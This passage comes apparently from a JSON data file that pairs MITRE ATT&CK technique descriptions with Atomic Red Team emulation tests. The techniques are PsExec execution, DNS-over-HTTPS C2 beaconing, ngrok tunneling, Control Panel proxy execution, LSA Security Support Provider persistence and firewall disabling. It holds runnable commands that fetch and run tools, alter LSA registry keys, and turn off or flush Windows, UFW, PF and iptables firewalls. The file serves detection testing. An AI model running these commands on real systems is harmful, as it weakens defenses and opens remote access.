-ItemType Directory (Split-Path \"#{psexec_exe}\") -Force | Out-Null\nCopy-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsTools\\PsExec.exe\" \"#{psexec_exe}\" -Force\n"}], "executor": {"command": "\"#{psexec_exe}\" #{remote_host} -accepteula -c #{command_path}\n", "name": "command_prompt", "elevation_required": true}}, {"name": "Execute command writing output to local Admin Share", "auto_generated_guid": "d41aaab5-bdfe-431d-a3d5-c29e9136ff46", "description": "Executes a command, writing the output to a local Admin Share.\nThis technique is used by post-exploitation frameworks.\n", "supported_platforms": ["windows"], "input_arguments": {"output_file": {"description": "Remote computer to receive the copy and execute the file", "type": "string", "default": "output.txt"}, "command_to_execute": {"description": "Command to execute for output.", "type": "string", "default": "hostname"}}, "executor": {"command": "cmd.exe /Q /c #{command_to_execute} 1> \\\\127.0.0.1\\ADMIN$\\#{output_file} 2>&1\n", "name": "command_prompt", "elevation_required": true}}]}, "T1572": {"name": "Protocol Tunneling", "technique_id": "attack-pattern--4fe28b27-b13c-453e-a386-c2ef362a573b", "external_id": "T1572", "data_components": ["Network Connection Creation", "Network Traffic Flow", "Network Traffic Content"], "kill_chain_phases": ["command-and-control"], "data_source_platforms": [], "mitigations": ["course-of-action--12241367-a8b7-49b4-b86e-2236901ba50c", "course-of-action--20f6a9df-37c4-4e20-9e47-025983b1b39d"], "description": "Adversaries may tunnel network communications to and from a victim system within a separate protocol to avoid detection/network filtering and/or enable access to otherwise unreachable systems. Tunneling involves explicitly encapsulating a protocol within another. This behavior may conceal malicious traffic by blending in with existing traffic and/or provide an outer layer of encryption (similar to a VPN). Tunneling could also enable routing of network packets that would otherwise not reach their intended destination, such as SMB, RDP, or other traffic that would be filtered by network appliances or not routed over the Internet. \n\nThere are various means to encapsulate a protocol within another protocol. For example, adversaries may perform SSH tunneling (also known as SSH port forwarding), which involves forwarding arbitrary data over an encrypted SSH tunnel.(Citation: SSH Tunneling) \n\n[Protocol Tunneling](https://attack.mitre.org/techniques/T1572) may also be abused by adversaries during [Dynamic Resolution](https://attack.mitre.org/techniques/T1568). Known as DNS over HTTPS (DoH), queries to resolve C2 infrastructure may be encapsulated within encrypted HTTPS packets.(Citation: BleepingComp Godlua JUL19) \n\nAdversaries may also leverage [Protocol Tunneling](https://attack.mitre.org/techniques/T1572) in conjunction with [Proxy](https://attack.mitre.org/techniques/T1090) and/or [Protocol Impersonation](https://attack.mitre.org/techniques/T1001/003) to further conceal C2 communications and infrastructure. ", "atomic_tests": [{"name": "DNS over HTTPS Large Query Volume", "auto_generated_guid": "ae9ef4b0-d8c1-49d4-8758-06206f19af0a", "description": "This test simulates an infected host sending a large volume of DoH queries to a command and control server.\nThe intent of this test is to trigger threshold based detection on the number of DoH queries either from a single source system or to a single targe domain.\nA custom domain and sub-domain will need to be passed as input parameters for this test to work. Upon execution, DNS information about the domain will be displayed for each callout in a JSON format.\n", "supported_platforms": ["windows"], "input_arguments": {"doh_server": {"description": "Default DoH resolver", "type": "string", "default": "https://8.8.8.8/resolve"}, "query_type": {"description": "DNS query type", "type": "string", "default": "TXT"}, "subdomain": {"description": "Subdomain prepended to the domain name", "type": "string", "default": "atomicredteam"}, "query_volume": {"description": "Number of DNS queries to send", "type": "integer", "default": 1000}, "domain": {"description": "Default domain to simulate against", "type": "string", "default": "127.0.0.1.xip.io"}}, "executor": {"command": "for($i=0; $i -le #{query_volume}; $i++) { (Invoke-WebRequest \"#{doh_server}?name=#{subdomain}.$(Get-Random -Minimum 1 -Maximum 999999).#{domain}&type=#{query_type}\" -UseBasicParsing).Content }\n", "name": "powershell"}}, {"name": "DNS over HTTPS Regular Beaconing", "auto_generated_guid": "0c5f9705-c575-42a6-9609-cbbff4b2fc9b", "description": "This test simulates an infected host beaconing via DoH queries to a command and control server at regular intervals over time.\nThis behaviour is typical of implants either in an idle state waiting for instructions or configured to use a low query volume over time to evade threshold based detection.\nA custom domain and sub-domain will need to be passed as input parameters for this test to work. Upon execution, DNS information about the domain will be displayed for each callout in a JSON format.\n", "supported_platforms": ["windows"], "input_arguments": {"doh_server": {"description": "Default DoH resolver", "type": "string", "default": "https://8.8.8.8/resolve"}, "runtime": {"description": "Time in minutes to run the simulation", "type": "integer", "default": 30}, "domain": {"description": "Default domain to simulate against", "type": "string", "default": "127.0.0.1.xip.io"}, "subdomain": {"description": "Subdomain prepended to the domain name", "type": "string", "default": "atomicredteam"}, "query_type": {"description": "DNS query type", "type": "string", "default": "TXT"}, "c2_interval": {"description": "Seconds between C2 requests to the command and control server", "type": "integer", "default": 30}, "c2_jitter": {"description": "Percentage of jitter to add to the C2 interval to create variance in the times between C2 requests", "type": "integer", "default": 20}}, "executor": {"command": "Set-Location \"PathToAtomicsFolder\"\n.\\T1572\\src\\T1572-doh-beacon.ps1 -DohServer #{doh_server} -Domain #{domain} -Subdomain #{subdomain} -QueryType #{query_type} -C2Interval #{c2_interval} -C2Jitter #{c2_jitter} -RunTime #{runtime}\n", "name": "powershell"}}, {"name": "DNS over HTTPS Long Domain Query", "auto_generated_guid": "748a73d5-cea4-4f34-84d8-839da5baa99c", "description": "This test simulates an infected host returning data to a command and control server using long domain names.\nThe simulation involves sending DoH queries that gradually increase in length until reaching the maximum length. The intent is to test the effectiveness of detection of DoH queries for long domain names over a set threshold.\n Upon execution, DNS information about the domain will be displayed for each callout in a JSON format.\n", "supported_platforms": ["windows"], "input_arguments": {"doh_server": {"description": "Default DoH resolver", "type": "string", "default": "https://8.8.8.8/resolve"}, "query_type": {"description": "DNS query type", "type": "string", "default": "TXT"}, "subdomain": {"description": "Subdomain prepended to the domain name (should be 63 characters to test maximum length)", "type": "string", "default": "atomicredteamatomicredteamatomicredteamatomicredteamatomicredte"}, "domain": {"description": "Default domain to simulate against", "type": "string", "default": "127.0.0.1.xip.io"}}, "executor": {"command": "Set-Location \"PathToAtomicsFolder\"\n.\\T1572\\src\\T1572-doh-domain-length.ps1 -DohServer #{doh_server} -Domain #{domain} -Subdomain #{subdomain} -QueryType #{query_type}\n", "name": "powershell"}}, {"name": "run ngrok", "auto_generated_guid": "4cdc9fc7-53fb-4894-9f0c-64836943ea60", "description": "Download and run ngrok. Create tunnel to chosen port.\n", "supported_platforms": ["windows"], "input_arguments": {"api_token": {"description": "ngrok API", "type": "string", "default": "N/A"}, "port_num": {"description": "port number for tunnel", "type": "integer", "default": 3389}, "download": {"description": "link to download ngrok", "type": "string", "default": "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-windows-amd64.zip"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "Download ngrok\n", "prereq_command": "if (Test-Path C:\\Users\\Public\\ngrok) {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Path C:\\Users\\Public\\ngrok -ItemType Directory | Out-Null\nInvoke-WebRequest #{download} -OutFile C:\\Users\\Public\\ngrok\\ngrok-v3-stable-windows-amd64.zip\nExpand-Archive C:\\Users\\Public\\ngrok\\ngrok-v3-stable-windows-amd64.zip -DestinationPath C:\\Users\\Public\\ngrok\n"}], "executor": {"command": "C:\\Users\\Public\\ngrok\\ngrok.exe config add-authtoken #{api_token} | Out-Null\nStart-Job -ScriptBlock { C:\\Users\\Public\\ngrok\\ngrok.exe tcp #{port_num} } | Out-Null\nStart-Sleep -s 5 \nStop-Job -Name Job1 | Out-Null\n", "cleanup_command": "Remove-Item C:\\Users\\Public\\ngrok -Recurse -ErrorAction Ignore\nRemove-Item C:\\%userprofile%\\AppData\\Local\\ngrok -ErrorAction Ignore\n", "name": "powershell", "elevation_required": true}}]}, "T1218.002": {"name": "Control Panel", "technique_id": "attack-pattern--4ff5d6a8-c062-4c68-a778-36fc5edd564f", "external_id": "T1218.002", "data_components": ["OS API Execution", "Windows Registry Key Modification", "Process Creation", "Command Execution", "Module Load", "File Creation"], "kill_chain_phases": ["defense-evasion"], "data_source_platforms": [], "mitigations": ["course-of-action--47e0e9fe-96ce-4f65-8bb1-8be1feacb5db", "course-of-action--987988f0-cf86-4680-a875-2f6456ab2448"], "description": "Adversaries may abuse control.exe to proxy execution of malicious payloads. The Windows Control Panel process binary (control.exe) handles execution of Control Panel items, which are utilities that allow users to view and adjust computer settings.\n\nControl Panel items are registered executable (.exe) or Control Panel (.cpl) files, the latter are actually renamed dynamic-link library (.dll) files that export a <code>CPlApplet</code> function.(Citation: Microsoft Implementing CPL)(Citation: TrendMicro CPL Malware Jan 2014) For ease of use, Control Panel items typically include graphical menus available to users after being registered and loaded into the Control Panel.(Citation: Microsoft Implementing CPL) Control Panel items can be executed directly from the command line, programmatically via an application programming interface (API) call, or by simply double-clicking the file.(Citation: Microsoft Implementing CPL) (Citation: TrendMicro CPL Malware Jan 2014)(Citation: TrendMicro CPL Malware Dec 2013)\n\nMalicious Control Panel items can be delivered via [Phishing](https://attack.mitre.org/techniques/T1566) campaigns(Citation: TrendMicro CPL Malware Jan 2014)(Citation: TrendMicro CPL Malware Dec 2013) or executed as part of multi-stage malware.(Citation: Palo Alto Reaver Nov 2017) Control Panel items, specifically CPL files, may also bypass application and/or file extension allow lists.\n\nAdversaries may also rename malicious DLL files (.dll) with Control Panel file extensions (.cpl) and register them to <code>HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Control Panel\\Cpls</code>. Even when these registered DLLs do not comply with the CPL file specification and do not export <code>CPlApplet</code> functions, they are loaded and executed through its <code>DllEntryPoint</code> when Control Panel is executed. CPL files not exporting <code>CPlApplet</code> are not directly executable.(Citation: ESET InvisiMole June 2020)", "atomic_tests": [{"name": "Control Panel Items", "auto_generated_guid": "037e9d8a-9e46-4255-8b33-2ae3b545ca6f", "description": "This test simulates an adversary leveraging control.exe\nUpon execution calc.exe will be launched\n", "supported_platforms": ["windows"], "input_arguments": {"cpl_file_path": {"description": "path to cpl file", "type": "path", "default": "PathToAtomicsFolder\\T1218.002\\bin\\calc.cpl"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "Cpl file must exist on disk at specified location (#{cpl_file_path})\n", "prereq_command": "if (Test-Path \"#{cpl_file_path}\") {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory (split-path \"#{cpl_file_path}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.002/bin/calc.cpl\" -OutFile \"#{cpl_file_path}\"\n"}], "executor": {"command": "control.exe \"#{cpl_file_path}\"\n", "name": "command_prompt"}}]}, "T1547.005": {"name": "Security Support Provider", "technique_id": "attack-pattern--5095a853-299c-4876-abd7-ac0050fb5462", "external_id": "T1547.005", "data_components": ["Command Execution", "Module Load", "Windows Registry Key Modification"], "kill_chain_phases": ["persistence", "privilege-escalation"], "data_source_platforms": [], "mitigations": ["course-of-action--72dade3e-1cba-4182-b3b3-a77ca52f02a1"], "description": "Adversaries may abuse security support providers (SSPs) to execute DLLs when the system boots. Windows SSP DLLs are loaded into the Local Security Authority (LSA) process at system start. Once loaded into the LSA, SSP DLLs have access to encrypted and plaintext passwords that are stored in Windows, such as any logged-on user's Domain password or smart card PINs.\n\nThe SSP configuration is stored in two Registry keys: <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Security Packages</code> and <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\OSConfig\\Security Packages</code>. An adversary may modify these Registry keys to add new SSPs, which will be loaded the next time the system boots, or when the AddSecurityPackage Windows API function is called.(Citation: Graeber 2014)", "atomic_tests": [{"name": "Modify HKLM:\\System\\CurrentControlSet\\Control\\Lsa Security Support Provider configuration in registry", "auto_generated_guid": "afdfd7e3-8a0b-409f-85f7-886fdf249c9e", "description": "Add a value to a Windows registry Security Support Provider pointing to a payload .dll which will normally need to be copied in the system32 folder.\nA common DLL used with this techquite is the minilib.dll from mimikatz, see https://pentestlab.blog/2019/10/21/persistence-security-support-provider/\n", "supported_platforms": ["windows"], "executor": {"command": "$oldvalue = $(Get-ItemProperty HKLM:\\System\\CurrentControlSet\\Control\\Lsa -Name 'Security Packages' | Select-Object -ExpandProperty 'Security Packages');\nSet-ItemProperty -Path \"HKLM:\\System\\CurrentControlSet\\Control\\Lsa\" -Name 'Security Packages old' -Value \"$oldvalue\";\n$newvalue = \"AtomicTest.dll\";\nSet-ItemProperty HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa -Name 'Security Packages' -Value $newvalue\n", "cleanup_command": "$oldvalue = $(Get-ItemPropertyValue -Path  \"HKLM:\\System\\CurrentControlSet\\Control\\Lsa\" -Name 'Security Packages old' | Select-Object -ExpandProperty 'Security Packages old');\nSet-ItemProperty -Path HKLM:\\System\\CurrentControlSet\\Control\\Lsa -Name 'Security Packages' -Value \"$oldvalue\";\nRemove-ItemProperty -Path  \"HKLM:\\System\\CurrentControlSet\\Control\\Lsa\" -Name 'Security Packages old';", "name": "powershell", "elevation_required": true}}, {"name": "Modify HKLM:\\System\\CurrentControlSet\\Control\\Lsa\\OSConfig Security Support Provider configuration in registry", "auto_generated_guid": "de3f8e74-3351-4fdb-a442-265dbf231738", "description": "Add a value to a Windows registry SSP key, simulating an adversarial modification of those keys.", "supported_platforms": ["windows"], "executor": {"command": "$oldvalue = $(Get-ItemProperty HKLM:\\System\\CurrentControlSet\\Control\\Lsa\\OSConfig -Name 'Security Packages' | Select-Object -ExpandProperty 'Security Packages');\nSet-ItemProperty -Path \"HKLM:\\System\\CurrentControlSet\\Control\\Lsa\\OSConfig\" -Name 'Security Packages old' -Value \"$oldvalue\";\n$newvalue = \"AtomicTest.dll\";\nSet-ItemProperty HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\OSConfig -Name 'Security Packages' -Value $newvalue\n", "cleanup_command": "$oldvalue = $(Get-ItemPropertyValue -Path  \"HKLM:\\System\\CurrentControlSet\\Control\\Lsa\\OSConfig\" -Name 'Security Packages old' | Select-Object -ExpandProperty 'Security Packages old');\nSet-ItemProperty -Path HKLM:\\System\\CurrentControlSet\\Control\\Lsa\\OSConfig -Name 'Security Packages' -Value \"$oldvalue\";\nRemove-ItemProperty -Path  \"HKLM:\\System\\CurrentControlSet\\Control\\Lsa\\OSConfig\" -Name 'Security Packages old';", "name": "powershell", "elevation_required": true}}]}, "T1562.004": {"name": "Disable or Modify System Firewall", "technique_id": "attack-pattern--5372c5fe-f424-4def-bcd5-d3a8e770f07b", "external_id": "T1562.004", "data_components": ["Firewall Disable", "Windows Registry Key Modification", "Command Execution", "Firewall Rule Modification"], "kill_chain_phases": ["defense-evasion"], "data_source_platforms": [], "mitigations": ["course-of-action--93e7968a-9074-4eac-8ae9-9f5200ec3317", "course-of-action--987988f0-cf86-4680-a875-2f6456ab2448", "course-of-action--a2c36a5d-4058-475e-8e77-fff75e50d3b9", "course-of-action--cc2399fd-3cd3-4319-8d0a-fbd6420cdaf8"], "description": "Adversaries may disable or modify system firewalls in order to bypass controls limiting network usage. Changes could be disabling the entire mechanism as well as adding, deleting, or modifying particular rules. This can be done numerous ways depending on the operating system, including via command-line, editing Windows Registry keys, and Windows Control Panel.\n\nModifying or disabling a system firewall may enable adversary C2 communications, lateral movement, and/or data exfiltration that would otherwise not be allowed. For example, adversaries may add a new firewall rule for a well-known protocol (such as RDP) using a non-traditional and potentially less securitized port (i.e. [Non-Standard Port](https://attack.mitre.org/techniques/T1571)).(Citation: change_rdp_port_conti)", "atomic_tests": [{"name": "Disable Microsoft Defender Firewall", "auto_generated_guid": "88d05800-a5e4-407e-9b53-ece4174f197f", "description": "Disables the Microsoft Defender Firewall for the current profile.\nCaution if you access remotely the host where the test runs! Especially with the cleanup command which will re-enable firewall for the current profile...\n", "supported_platforms": ["windows"], "executor": {"command": "netsh advfirewall set currentprofile state off\n", "cleanup_command": "netsh advfirewall set currentprofile state on >nul 2>&1\n", "name": "command_prompt"}}, {"name": "Disable Microsoft Defender Firewall via Registry", "auto_generated_guid": "afedc8c4-038c-4d82-b3e5-623a95f8a612", "description": "Disables the Microsoft Defender Firewall for the public profile via registry\nCaution if you access remotely the host where the test runs! Especially with the cleanup command which will re-enable firewall for the current profile...\n", "supported_platforms": ["windows"], "executor": {"command": "reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\PublicProfile\" /v \"EnableFirewall\" /t REG_DWORD /d 0 /f\n", "cleanup_command": "reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\PublicProfile\" /v \"EnableFirewall\" /t REG_DWORD /d 1 /f\n", "name": "command_prompt"}}, {"name": "Allow SMB and RDP on Microsoft Defender Firewall", "auto_generated_guid": "d9841bf8-f161-4c73-81e9-fd773a5ff8c1", "description": "Allow all SMB and RDP rules on the Microsoft Defender Firewall for all profiles.\nCaution if you access remotely the host where the test runs! Especially with the cleanup command which will reset the firewall and risk disabling those services...\n", "supported_platforms": ["windows"], "executor": {"command": "netsh advfirewall firewall set rule group=\"remote desktop\" new enable=Yes\nnetsh advfirewall firewall set rule group=\"file and printer sharing\" new enable=Yes\n", "cleanup_command": "netsh advfirewall reset >nul 2>&1\n", "name": "command_prompt"}}, {"name": "Opening ports for proxy - HARDRAIN", "auto_generated_guid": "15e57006-79dd-46df-9bf9-31bc24fb5a80", "description": "This test creates a listening interface on a victim device. This tactic was used by HARDRAIN for proxying.\n\nreference: https://www.us-cert.gov/sites/default/files/publications/MAR-10135536-F.pdf\n", "supported_platforms": ["windows"], "executor": {"command": "netsh advfirewall firewall add rule name=\"atomic testing\" action=allow dir=in protocol=TCP localport=450 \n", "cleanup_command": "netsh advfirewall firewall delete rule name=\"atomic testing\" protocol=TCP localport=450 >nul 2>&1", "name": "command_prompt", "elevation_required": true}}, {"name": "Open a local port through Windows Firewall to any profile", "auto_generated_guid": "9636dd6e-7599-40d2-8eee-ac16434f35ed", "description": "This test will attempt to open a local port defined by input arguments to any profile", "supported_platforms": ["windows"], "input_arguments": {"local_port": {"description": "This is the local port you wish to test opening", "type": "integer", "default": 3389}}, "executor": {"command": "netsh advfirewall firewall add rule name=\"Open Port to Any\" dir=in protocol=tcp localport=#{local_port} action=allow profile=any", "cleanup_command": "netsh advfirewall firewall delete rule name=\"Open Port to Any\" | Out-Null", "name": "powershell", "elevation_required": true}}, {"name": "Allow Executable Through Firewall Located in Non-Standard Location", "auto_generated_guid": "6f5822d2-d38d-4f48-9bfc-916607ff6b8c", "description": "This test will attempt to allow an executable through the system firewall located in the Users directory", "supported_platforms": ["windows"], "input_arguments": {"exe_file_path": {"description": "path to exe file", "type": "path", "default": "PathToAtomicsFolder\\T1562.004\\bin\\AtomicTest.exe"}}, "executor": {"command": "Copy-Item \"#{exe_file_path}\" -Destination \"C:\\Users\\$env:UserName\" -Force\nnetsh advfirewall firewall add rule name=\"Atomic Test\" dir=in action=allow program=\"C:\\Users\\$env:UserName\\AtomicTest.exe\" enable=yes\n", "cleanup_command": "netsh advfirewall firewall delete rule name=\"Atomic Test\" | Out-Null\nRemove-Item C:\\Users\\$env:UserName\\AtomicTest.exe -ErrorAction Ignore\n", "name": "powershell", "elevation_required": true}}, {"name": "Stop/Start UFW firewall", "auto_generated_guid": "fe135572-edcd-49a2-afe6-1d39521c5a9a", "description": "Stop the Uncomplicated Firewall (UFW) if installed.\n", "supported_platforms": ["linux"], "dependency_executor_name": "sh", "dependencies": [{"description": "Check if ufw is installed on the machine.\n", "prereq_command": "if [ ! -x \"$(command -v ufw)\" ]; then echo -e \"\\n***** ufw NOT installed *****\\n\"; exit 1; fi\nif echo \"$(ufw status)\" |grep -q \"inactive\"; then echo -e \"\\n***** ufw inactive *****\\n\"; exit 1; fi \n", "get_prereq_command": "echo \"\"\n"}], "executor": {"name": "sh", "elevation_required": true, "command": "ufw disable\n", "cleanup_command": "ufw enable\nufw status verbose\n"}}, {"name": "Stop/Start Packet Filter", "auto_generated_guid": "0ca82ed1-0a94-4774-9a9a-a2c83a8022b7", "description": "Stop the Packet Filter if installed.\n", "supported_platforms": ["linux"], "dependency_executor_name": "sh", "dependencies": [{"description": "Check if pfctl is installed on the machine.\n", "prereq_command": "if [ ! -x \"$(command -v pfctl)\" ]; then echo -e \"\\n***** PF NOT installed *****\\n\"; exit 1; fi\nif [ \"$(kldstat -n pf)\" = \"\" ]; then echo -e \"\\n***** PF inactive *****\\n\"; exit 1; fi \n", "get_prereq_command": "echo \"\"\n"}], "executor": {"name": "sh", "elevation_required": true, "command": "service pf stop\nservice pf disable\n", "cleanup_command": "service pf enable\nservice pf start\nservice pf status\n"}}, {"name": "Stop/Start UFW firewall systemctl", "auto_generated_guid": "9fd99609-1854-4f3c-b47b-97d9a5972bd1", "description": "Stop the Uncomplicated Firewall (UFW) if installed, using systemctl. \n", "supported_platforms": ["linux"], "dependency_executor_name": "sh", "dependencies": [{"description": "Check if systemctl and ufw is installed on the machine.\n", "prereq_command": "if [ ! -x \"$(command -v systemctl)\" ]; then echo -e \"\\n***** systemctl NOT installed *****\\n\"; exit 1; fi\nif [ ! -x \"$(command -v ufw)\" ]; then echo -e \"\\n***** ufw NOT installed *****\\n\"; exit 1; fi\nif echo \"$(ufw status)\" |grep -q \"inactive\"; then echo -e \"\\n***** ufw inactive *****\\n\"; exit 1; fi \n", "get_prereq_command": "echo \"\"\n"}], "executor": {"name": "sh", "elevation_required": true, "command": "systemctl stop ufw\n", "cleanup_command": "systemctl start ufw\nsystemctl status ufw\n"}}, {"name": "Turn off UFW logging", "auto_generated_guid": "8a95b832-2c2a-494d-9cb0-dc9dd97c8bad", "description": "Turn off the Uncomplicated Firewall (UFW) logging. \n", "supported_platforms": ["linux"], "dependency_executor_name": "sh", "dependencies": [{"description": "Check if ufw is installed on the machine and enabled.\n", "prereq_command": "if [ ! -x \"$(command -v ufw)\" ]; then echo -e \"\\n***** ufw NOT installed *****\\n\"; exit 1; fi\nif echo \"$(ufw status)\" |grep -q \"inactive\"; then echo -e \"\\n***** ufw inactive *****\\n\"; exit 1; fi \n", "get_prereq_command": "echo \"\"\n"}], "executor": {"name": "sh", "elevation_required": true, "command": "ufw logging off\n", "cleanup_command": "ufw logging low\nufw status verbose\n"}}, {"name": "Add and delete UFW firewall rules", "auto_generated_guid": "b2563a4e-c4b8-429c-8d47-d5bcb227ba7a", "description": "Add and delete a rule on the Uncomplicated Firewall (UFW) if installed and enabled. \n", "supported_platforms": ["linux"], "dependency_executor_name": "sh", "dependencies": [{"description": "Check if ufw is installed on the machine and enabled.\n", "prereq_command": "if [ ! -x \"$(command -v ufw)\" ]; then echo -e \"\\n***** ufw NOT installed *****\\n\"; exit 1; fi\nif echo \"$(ufw status)\" |grep -q \"inactive\"; then echo -e \"\\n***** ufw inactive *****\\n\"; exit 1; fi \n", "get_prereq_command": "echo \"\"\n"}], "executor": {"name": "sh", "elevation_required": true, "command": "ufw prepend deny from 1.2.3.4\nufw status numbered\n", "cleanup_command": "{ echo y; echo response; } | ufw delete 1\nufw status numbered\n"}}, {"name": "Add and delete Packet Filter rules", "auto_generated_guid": "8b23cae1-66c1-41c5-b79d-e095b6098b5b", "description": "Add and delete a rule on the Packet Filter (PF) if installed and enabled. \n", "supported_platforms": ["linux"], "dependency_executor_name": "sh", "dependencies": [{"description": "Check if pf is installed on the machine and enabled.\n", "prereq_command": "if [ ! -x \"$(command -v pfctl)\" ]; then echo -e \"\\n***** PF NOT installed *****\\n\"; exit 1; fi\nif [ \"$(kldstat -n pf)\" = \"\" ]; then echo -e \"\\n***** PF inactive *****\\n\"; exit 1; fi \n", "get_prereq_command": "echo \"anchor pf-rules >> /etc/pf.conf\"\npfctl -f /etc/pf.conf\n"}], "executor": {"name": "sh", "elevation_required": true, "command": "echo \"block in proto tcp from 1.2.3.4 to any\" | pfctl -a pf-rules -f -\npfctl -a pf-rules -s rules\n", "cleanup_command": "pfctl -a pf-rules -F rules\nsed -i \"\" '/anchor pf-rules/d'\npfctl -f /etc/pf.conf\n"}}, {"name": "Edit UFW firewall user.rules file", "auto_generated_guid": "beaf815a-c883-4194-97e9-fdbbb2bbdd7c", "description": "Edit the Uncomplicated Firewall (UFW) rules file /etc/ufw/user.rules.\n", "supported_platforms": ["linux"], "dependency_executor_name": "sh", "dependencies": [{"description": "Check if /etc/ufw/user.rules exists.\n", "prereq_command": "if [ ! -f \"/etc/ufw/user.rules\" ]; then echo -e \"\\n***** ufw NOT installed *****\\n\"; exit 1; fi\n", "get_prereq_command": "echo \"\"\n"}], "executor": {"name": "sh", "elevation_required": true, "command": "echo \"# THIS IS A COMMENT\" >> /etc/ufw/user.rules\ngrep \"# THIS IS A COMMENT\" /etc/ufw/user.rules\n", "cleanup_command": "sed -i 's/# THIS IS A COMMENT//g' /etc/ufw/user.rules\n"}}, {"name": "Edit UFW firewall ufw.conf file", "auto_generated_guid": "c1d8c4eb-88da-4927-ae97-c7c25893803b", "description": "Edit the Uncomplicated Firewall (UFW) configuration file /etc/ufw/ufw.conf \nwhich controls if the firewall starts on boot and its logging level.\n", "supported_platforms": ["linux"], "dependency_executor_name": "sh", "dependencies": [{"description": "Check if /etc/ufw/ufw.conf exists.\n", "prereq_command": "if [ ! -f \"/etc/ufw/ufw.conf\" ]; then echo -e \"\\n***** ufw NOT installed *****\\n\"; exit 1; fi\n", "get_prereq_command": "echo \"\"\n"}], "executor": {"name": "sh", "elevation_required": true, "command": "echo \"# THIS IS A COMMENT\" >> /etc/ufw/ufw.conf\ngrep \"# THIS IS A COMMENT\" /etc/ufw/ufw.conf\n", "cleanup_command": "sed -i 's/# THIS IS A COMMENT//g' /etc/ufw/ufw.conf\ncat /etc/ufw/ufw.conf\n"}}, {"name": "Edit UFW firewall sysctl.conf file", "auto_generated_guid": "c4ae0701-88d3-4cd8-8bce-4801ed9f97e4", "description": "Edit the Uncomplicated Firewall (UFW) configuration file for setting network \nvariables /etc/ufw/sysctl.conf.\n", "supported_platforms": ["linux"], "dependency_executor_name": "sh", "dependencies": [{"description": "Check if /etc/ufw/sysctl.conf exists.\n", "prereq_command": "if [ ! -f \"/etc/ufw/sysctl.conf\" ]; then echo -e \"\\n***** ufw NOT installed *****\\n\"; exit 1; fi\n", "get_prereq_command": "echo \"\"\n"}], "executor": {"name": "sh", "elevation_required": true, "command": "echo \"# THIS IS A COMMENT\" >> /etc/ufw/sysctl.conf\ngrep \"# THIS IS A COMMENT\" /etc/ufw/sysctl.conf\n", "cleanup_command": "sed -i 's/# THIS IS A COMMENT//g' /etc/ufw/sysctl.conf\ncat /etc/ufw/sysctl.conf\n"}}, {"name": "Edit UFW firewall main configuration file", "auto_generated_guid": "7b697ece-8270-46b5-bbc7-6b9e27081831", "description": "Edit the Uncomplicated Firewall (UFW) main configuration file for setting \ndefault policies /etc/default/ufw.\n", "supported_platforms": ["linux"], "dependency_executor_name": "sh", "dependencies": [{"description": "Check if /etc/default/ufw exists.\n", "prereq_command": "if [ ! -f \"/etc/default/ufw\" ]; then echo -e \"\\n***** ufw NOT installed *****\\n\"; exit 1; fi\n", "get_prereq_command": "echo \"\"\n"}], "executor": {"name": "sh", "elevation_required": true, "command": "echo \"# THIS IS A COMMENT\" >> /etc/default/ufw\ngrep \"# THIS IS A COMMENT\" /etc/default/ufw\n", "cleanup_command": "sed -i 's/# THIS IS A COMMENT//g' /etc/default/ufw\n"}}, {"name": "Tail the UFW firewall log file", "auto_generated_guid": "419cca0c-fa52-4572-b0d7-bc7c6f388a27", "description": "Print  the last 10 lines of the Uncomplicated Firewall (UFW) log file \n/var/log/ufw.log.\n", "supported_platforms": ["linux"], "dependency_executor_name": "sh", "dependencies": [{"description": "Check if /var/log/ufw.log exists.\n", "prereq_command": "if [ ! -f \"/var/log/ufw.log\" ]; then echo -e \"\\n***** ufw NOT logging *****\\n\"; exit 1; fi\n", "get_prereq_command": "echo \"\"\n"}], "executor": {"name": "sh", "elevation_required": true, "command": "tail /var/log/ufw.log\n", "cleanup_command": ""}}, {"name": "Disable iptables", "auto_generated_guid": "7784c64e-ed0b-4b65-bf63-c86db229fd56", "description": "Some Linux systems may not activate ufw, but use iptables for firewall rules instead. (ufw works on top of iptables.) \nAttackers cannot directly disable iptables, as it is not implemented as a service like ufw. But they can flush all iptables \nrules, which in fact \"disable\" iptables. \n", "supported_platforms": ["linux"], "dependency_executor_name": "sh", "dependencies": [{"description": "Check if iptables is installed on the machine.\n", "prereq_command": "if [ ! -x \"$(command -v iptables)\" ]; then echo -e \"\\n***** iptables NOT installed *****\\n\"; exit 1; fi\n", "get_prereq_command": "echo \"\"\n"}], "executor": {"name": "sh", "elevation_required": true, "command": "iptables-save > /tmp/iptables.rules\niptables -F\n", "cleanup_command": "iptables-restore < /tmp/iptables.rules\n"}}, {"name": "Modify/delete iptables firewall rules", "auto_generated_guid": "899a7fb5-d197-4951-8614-f19ac4a73ad4", "description": "Instead of completely \"disabling\" iptables, adversaries may choose to delete a certain rule, which, for example, blocks data exfiltration via ftp.\nBy doing so, they may cause less noise to avoid detection. \n", "supported_platforms": ["linux"], "dependency_executor_name": "sh", "dependencies": [{"description": "Check if iptables is installed on the machine.\n", "prereq_command": "if [ ! -x \"$(command -v iptables)\" ]; then echo -e \"\\n***** iptables NOT installed *****\\n\"; exit 1; fi\nif ! echo \"$(iptables -L)\" | grep -q \"DROP .*dpt:ftp\"; then echo -e \"\\n***** this firewall rule is NOT activated *****\\n***** activate it by executing \\\"iptables -A OUTPUT -p tcp --dport 21 -j DROP\\\" *****\\n\"; exit 1; fi\n", "get_prereq_command": "echo \"\"\n"}], "executor": {"name": "sh", "elevation_required": true, "command": "iptables-save > /tmp/iptables.rules\niptables -D OUTPUT -p tcp --dport 21 -j DROP\n", "cleanup_command": "iptables-restore < /tmp/iptables.rules\n"}}, 